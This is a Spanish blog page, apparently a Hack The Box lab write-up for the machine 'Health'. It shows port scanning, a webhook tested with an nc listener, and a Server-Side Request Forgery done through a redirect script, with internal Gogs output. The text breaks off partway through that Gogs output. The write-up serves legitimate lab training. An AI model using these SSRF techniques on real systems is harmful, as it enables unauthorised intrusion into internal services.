@@ -1,0 +1,888 @@
+<!doctype html><html lang="es"><head><title>Health | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs"><meta itemprop="description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs"><meta name="twitter:card" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs"><meta name="twitter:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs"><meta property="og:description" content="Hack The Box. Linux. Máquina media. Esta máquina tiene una funcionalidad de webhook que parece vulnerable a Server-Side Request Forgery. Tras probar varios bypasses, vemos que el ataque de SSRF funciona mediante una redirección. Internamente, hay una versión de Gogs desactualizada que es vulnerable a SQLi. Una vez que tenemos un payload para extraer hashes de contraseñas de la base de datos, podemos obtenerlos y romperlos de la instanca de Gogs remota con SQLi a través de SSRF. Luego, conseguimos una conexión por SSH y descubrimos que podemos introducir rutas locales en la base de datos para leer archivos del servidor como root. En este write-up se utiliza un script en Python para realizar el ataque de SSRF y un programa en Go para romper los hashes de Gogs"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/Health/Health.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Health/Health.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Health/Health.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="Health"><meta property="twitter:title" content="Health"><meta property="og:title" content="Health"><meta property="og:url" content="https://7rocky.github.io/htb/health/"><meta itemprop="keywords" content="git,cve,ssrf,sqli,mysql,password-reuse,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/health/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/health/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/health/&text=Health" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/health/&title=Health" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Health</h1><time class="mt4 f6 dib tracked" datetime="2023-01-07T00:00:00+01:00">07 / 01 / 2023</time><br><p class="mb4 f6 dib tracked">18 minutos de lectura</p></header><div class="htb-image"><img alt="Health" src="/images/HTB/Health/Health.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/ssrf" title="Server-Side Request Forgery">Server-Side Request Forgery</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sqli" title="Inyección de código SQL">Inyección de código SQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/mysql" title></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de hashes de contraseñas">Descifrado de hashes de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#_server-side-request-forgery_"><em>Server-Side Request Forgery</em></a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#configuración-de-gogs">Configuración de Gogs</a></li><li><a href="#explotación-de-gogs">Explotación de Gogs</a></li><li><a href="#rompiendo-el-_hash_">Rompiendo el <em>hash</em></a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#análisis-de-código-fuente">Análisis de código fuente</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Media</li><li><strong>Dirección IP</strong>: 10.10.11.176</li><li><strong>Fecha</strong>: 20 / 08 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.176 -p 22,80,3000
+Nmap scan report for 10.10.11.176
+Host is up (0.062s latency).
+
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
+|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
+|_  256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
+80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HTTP Monitoring Tool
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+3000/tcp filtered ppp
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+# Nmap done -- 1 IP address (1 host up) scanned in 25.24 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP). El puerto 3000 está filtrado.</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.176</code>, veremos la siguiente página web:</p><p><img src="/images/HTB/Health/Health-1.png" alt="Health 1"></p><p>Hay una sola funcionalidad denominada <em>webhook</em>. Esta aplicación web nos permite monitorizar una URL dada para que se nos notifique cuando dicha URL esté disponible o no. Por ejemplo, podemos ingresar nuestra propia dirección IP como <code>monitoredUrl</code> (<code>http://10.10.17.44:8000</code>). La notificación llegará a otra URL como petición POST, usemos <code>http://10.10.17.44</code>:</p><p><img src="/images/HTB/Health/Health-2.png" alt="Health 2"></p><p>Y aquí tenemos el resultado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
+Serving HTTP on :: port 8000 (http://[::]:8000/) ...  
+::ffff:10.10.11.176 - - [] "GET / HTTP/1.0" 200 -
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.11.176.
+Ncat: Connection from 10.10.11.176:49896.
+POST / HTTP/1.1
+Host: 10.10.17.44
+Accept: */*
+Content-type: application/json
+Content-Length: 631
+
+{"webhookUrl":"http:\/\/10.10.17.44","monitoredUrl":"http:\/\/10.10.17.44:8000","health":"up","body":"&lt;!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\"&gt;\n&lt;title&gt;Directory listing for \/&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Directory listing for \/&lt;\/h1&gt;\n&lt;hr&gt;\n&lt;ul&gt;\n&lt;\/ul&gt;\n&lt;hr&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.9","Date":"","Content-type":"text\/html; charset=utf-8","Content-Length":"297"}}  
+</code></pre></div><p>Como se muestra arriba, obtuvimos una petición a <code>http://10.10.17.44:8000</code>, y la respuesta se envía como petición POST a <code>http://10.10.17.44</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 127.0.0.1:8000
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;  
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><h3 id="_server-side-request-forgery_"><em>Server-Side Request Forgery</em></h3><p>En este punto, podemos tratar de monitorizar una URL interna, como <code>http://127.0.0.1</code> (ataque de SSRF):</p><p><img src="/images/HTB/Health/Health-3.png" alt="Health 3"></p><p>No obstante, parece estar bloqueado:</p><p><img src="/images/HTB/Health/Health-4.png" alt="Health 4"></p><p>En <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">HackTricks</a> Podemos encontrar algunos derivaciones para las cargas útiles de SSRF, pero ninguno de ellos funciona</p><p>En cambio, podemos emplear una redirección (<code>302 Found</code>) de manera que el cliente web que mira la URL monitorizada sea redirigido a otra URL. De hecho, esto funciona y podemos probar cualquier URL interna.</p><p>Para este ataque, creé un <em>script</em> en Python que configura un servidor Flask con <code>/monitored</code> y <code>/payload</code> como rutas. La primera aplica la redirección y la segunda muestra el resultado de la respuesta HTTP. Adicionalmente, la configuración del <em>webhook</em> también se realiza en el <em>script</em>: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Health/ssrf.py"><code>ssrf.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Health#ssrfpy">aquí</a>).</p><p><img src="/images/HTB/Health/Health-5.png" alt="Health 5"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span>
+[!] Usage: ssrf.py &lt;lhost&gt; &lt;monitored-url&gt;
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span> 10.10.17.44 http://127.0.0.1
+ * Serving Flask app 'ssrf'
+ * Debug mode: off
+
+[+] SSRF Response:
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;
+    &lt;title&gt;HTTP Monitoring Tool&lt;/title&gt;
+    &lt;link href="http://127.0.0.1/css/app.css" rel="stylesheet" type="text/css"/&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="container"&gt;
+        &lt;div class="container" style="padding: 150px"&gt;
+
+        &lt;h1 class="text-center"&gt;health.htb&lt;/h1&gt;
+        &lt;h4 class="text-center"&gt;Simple health checks for any URL&lt;/h4&gt;
+
+        &lt;hr&gt;
+
+
+
+
+        &lt;p&gt;This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.&lt;/p&gt;  
+
+        &lt;div class="card-header"&gt;
+            Configure Webhook
+        &lt;/div&gt;
+
+
+
+
+
+        &lt;div class="mx-auto" style="width: 700px; padding: 20px 0 70px 0"&gt;
+            &lt;form method="post" action="http://127.0.0.1/webhook"&gt;
+                &lt;input type="hidden" name="_token" value="txc71t3qfgeSN3Ppwouhtvs4kNRtHqOfPsgfvmlF"&gt;
+                &lt;div class="pt-2 form-group"&gt;
+                    &lt;label for="webhookUrl"&gt;Payload URL:&lt;/label&gt;
+                    &lt;input type="text" class="form-control" name="webhookUrl"
+                           placeholder="http://example.com/postreceive"/&gt;
+                &lt;/div&gt;
+
+                &lt;div class="pt-2 form-group"&gt;
+                    &lt;label for="monitoredUrl"&gt;Monitored URL:&lt;/label&gt;
+                    &lt;input type="text" class="form-control" name="monitoredUrl" placeholder="http://example.com"/&gt;
+                &lt;/div&gt;
+
+                &lt;div class="pt-2 form-group"&gt;
+                    &lt;label for="frequency"&gt;Interval:&lt;/label&gt;
+                    &lt;input type="text" class="form-control" name="frequency" placeholder="*/5 * * * *"/&gt;
+                    &lt;small class="form-text text-muted"&gt;Please make use of cron syntax, see &lt;a
+                            href="https://crontab.guru/"&gt;here&lt;/a&gt; for reference.&lt;/small&gt;
+                &lt;/div&gt;
+
+                &lt;p class="pt-3"&gt;Under what circumstances should the webhook be sent?&lt;/p&gt;
+
+                &lt;select class="form-select" name="onlyError"&gt;
+                    &lt;option value="1" selected&gt;Only when Service is not available&lt;/option&gt;
+                    &lt;option value="0"&gt;Always&lt;/option&gt;
+                &lt;/select&gt;
+
+                &lt;div class="pt-2"&gt;
+                    &lt;input type="submit" class="btn btn-primary float-end" name="action"
+                           value="Create"/&gt;
+                    &lt;input type="submit" class="btn btn-success float-end" style="margin-right: 2px" name="action"
+                           value="Test"/&gt;
+                &lt;/div&gt;
+
+            &lt;/form&gt;
+        &lt;/div&gt;
+
+        &lt;h4&gt;About:&lt;/h4&gt;
+&lt;p&gt;This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.&lt;/p&gt;
+        &lt;h4&gt;For Developers:&lt;/h4&gt;
+&lt;p&gt;Once the webhook has been created, the webhook recipient is periodically informed about the status of the monitored application by means of a post request containing various details about the http service.&lt;/p&gt;
+        &lt;h4&gt;Its simple:&lt;/h4&gt;
+        &lt;p&gt;No authentication is required. Once you create a monitoring job, a UUID is generated which you can share
+            with
+            others to manage the job easily.&lt;/p&gt;
+
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script src="http://127.0.0.1/js/app.js" type="text/js"&gt;&lt;/script&gt;
+
+
+&lt;!-- Footer --&gt;
+
+...
+
+&lt;!-- Footer --&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>En este punto, podemos ver qué servicio corre en el puerto 3000:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">ssrf.py</span> 10.10.17.44 http://127.0.0.1:3000
+ * Serving Flask app 'ssrf'
+ * Debug mode: off
+
+[+] SSRF Response:
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+        &lt;head data-suburl=""&gt;
+                &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+        &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;
+        &lt;meta name="author" content="Gogs - Go Git Service" /&gt;
+                &lt;meta name="description" content="Gogs(Go Git Service) a painless self-hosted Git Service written in Go" /&gt;
+                &lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;
+                &lt;meta name="_csrf" content="WJDAc67LtowFFe9KpcEtGx_rfP86MTY3MzA3MTYzNDIzNTk3MzY3NQ==" /&gt;
+
+
+                &lt;link rel="shortcut icon" href="/img/favicon.png" /&gt;
+
+
+                &lt;link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css"&gt;
+
+                &lt;script src="//code.jquery.com/jquery-1.11.1.min.js"&gt;&lt;/script&gt;
+
+
+                &lt;link rel="stylesheet" href="/ng/css/ui.css"&gt;
+                &lt;link rel="stylesheet" href="/ng/css/gogs.css"&gt;
+                &lt;link rel="stylesheet" href="/ng/css/tipsy.css"&gt;
+                &lt;link rel="stylesheet" href="/ng/css/magnific-popup.css"&gt;
+                &lt;link rel="stylesheet" href="/ng/fonts/octicons.css"&gt;
+                &lt;link rel="stylesheet" href="/css/github.min.css"&gt;
+
+
+        &lt;script src="/ng/js/lib/lib.js"&gt;&lt;/script&gt;
+        &lt;script src="/ng/js/lib/jquery.tipsy.js"&gt;&lt;/script&gt;
+        &lt;script src="/ng/js/lib/jquery.magnific-popup.min.js"&gt;&lt;/script&gt;
+        &lt;script src="/ng/js/utils/tabs.js"&gt;&lt;/script&gt;
+        &lt;script src="/ng/js/utils/preview.js"&gt;&lt;/script&gt;
+                &lt;script src="/ng/js/gogs.js"&gt;&lt;/script&gt;
+
+                &lt;title&gt;Gogs: Go Git Service&lt;/title&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+                &lt;div id="wrapper"&gt;
+                &lt;noscript&gt;Please enable JavaScript in your browser!&lt;/noscript&gt;
+
+&lt;header id="header"&gt;
